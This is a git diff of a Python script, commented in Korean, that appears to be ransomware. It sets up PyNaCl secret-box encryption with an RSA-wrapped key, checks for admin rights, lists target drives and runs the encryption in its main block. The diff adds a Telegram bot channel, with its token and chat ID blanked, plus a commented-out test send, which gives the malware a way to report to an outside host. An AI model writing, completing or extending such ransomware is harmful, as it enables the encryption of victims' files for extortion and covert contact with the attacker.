@@ -6,6 +6,7 @@ from time import sleep
 from tkinter import messagebox
 from datetime import datetime#https://pynacl.readthedocs.io/en/latest/public/
 from nacl.public import PrivateKey, Box
+import telegram, asyncio
 
     #1. 암호화와 복호화를 수행할 클래스. 파일명을 리스트로 받고, 암호화 복호화 모듈로 nacl.secretbox.SecretBox()인터페이스를 받는다.
 class EnDecryptor:
@@ -59,7 +60,6 @@ elif len(sys.argv)==2:
     #3. AES기반 암호화 모듈 생성(위의 키값 이용)
 EncryptModule=nacl.secret.SecretBox(Key)
 
-
     #4. RSA기반 Server와 Client의 개인 및 공개키 정보 저장 클래스
 class Server:
     def __init__(self, privateKey, targetPublicKey):
@@ -86,6 +86,11 @@ client=Client(clientPrivateKey, serverPrivateKey.public_key)
     #7. 기본 환경설정
 MaxThread=120
 IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()
+BOT=telegram.Bot(token='')#보안
+CHAT_ID=0#보안
+
+async def sendTelegram(chat_id, msg):
+    await BOT.send_message(chat_id, msg)
 
     #8. 암호화 타겟 드라이브 리스트화
 #PathList=[r"C:\Users\\"]
@@ -172,6 +177,10 @@ def getKey():
 
     #실제 암호화를 실행한다.
 if __name__ == '__main__':
+    #print("전송시도")
+    #asyncio.run(sendTelegram(CHAT_ID, "테스트전송메시지"))
+    #print("전송")
+    #sleep(100)
     print("[DEBUG] admin여부", IsAdmin)
     saveKey()#RSA사용하여 키를 암호화하여 저장
     getKey()#RSA사용하여 키를 복호화하여 로드
